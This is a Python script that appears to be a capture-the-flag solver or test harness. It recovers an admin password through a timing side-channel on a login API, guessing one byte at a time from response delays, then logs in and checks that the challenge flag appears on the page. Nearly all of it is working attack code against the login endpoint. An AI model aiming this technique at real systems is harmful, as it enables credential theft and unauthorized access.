import requests
import argparse
import yaml
import logging
import re
from pathlib import Path

HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / 'meta.yml'))['flags']
OAST = re.compile(r'\[.*INF.*\] ([a-z0-9]+\.[a-z0-9]+\.[a-z]+)')

logger = logging.getLogger('secretary')

HASH = 7 * [0]
PICKED = 7 * [False]

def test(root_url):
    url = f'{root_url}/api/login'

    def find_binding():
        for i in range(7):
            if PICKED[i]:
                continue

            test = HASH[:i] + [0xFF] + HASH[i+1:]
            pw = int.from_bytes(test, 'big')
            resp = requests.post(url, json={'username': 'admin', 'password': pw})
            print(resp.elapsed.microseconds)
            if resp.elapsed.microseconds > 350000:
                return i

    def pick(i):
        for b in range(1, 256):
            test = HASH[:i] + [b] + HASH[i+1:]
            pw = int.from_bytes(test, 'big')
            resp = requests.post(url, json={'username': 'admin', 'password': pw})
            print(resp.elapsed.microseconds)
            if resp.elapsed.microseconds < 350001:
                print('Response in', resp.elapsed.microseconds)
                HASH[i] = b
                print(f'Click out of {i} at {b}')
                break
        else:
            print('Giving up, assuming pin is set at 0')
            HASH[i] = 0

        PICKED[i] = True



    for _ in range(7):
        b = find_binding()
        print(b, 'is binding')
        pick(b)
        print(HASH)
        print(PICKED)

    pw = int.from_bytes(HASH, 'big')
    print('Password is', pw)
    session = requests.Session()
    session.post(url, json={'username': 'admin', 'password': pw})
    resp = session.get(root_url)

    assert FLAG in resp.text, resp.text

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('url', default='http://localhost:5000', nargs='?')
    args = parser.parse_args()

    test(args.url)

